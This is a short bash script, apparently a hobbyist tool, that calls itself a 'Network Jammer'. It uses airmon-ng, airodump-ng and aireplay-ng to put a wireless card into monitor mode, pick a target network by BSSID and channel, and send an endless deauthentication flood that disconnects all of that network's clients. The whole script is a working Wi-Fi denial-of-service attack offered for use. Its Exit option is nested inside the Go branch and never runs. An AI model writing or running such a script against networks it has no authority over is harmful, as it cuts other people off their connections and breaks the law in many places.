#!/bin/bash

main_airmon(){
echo "1:) Check Ur Intrafce Name"
ifconfig
echo "Enter Ur Interface Name"
read interface
echo "The Network Conection Will Be Down"
airmon-ng start $interface
airmon-ng check kill
echo "2:) Checking For Network"
airodump-ng $interface
echo "3:) Enter a Network bssid"
read bssid
echo "4:) Enter Network Channel No"
read channel
airmon-ng start $interface $channel
clear
echo "Starting ......"
aireplay-ng --deauth -0 0 -a $bssid $interface
echo "dont Forget to follow me on instagram k_fc_"
}
main(){
echo First Of All Enter With Root Pirmtion
echo Welcome To Network Jammer By k_fc_
echo Go ? Or Exit ?
read main
if [ $main == Go ]
then
main_airmon "$@"
if [ $main == Exit ]
then
exit
fi
fi
}

main "$@"
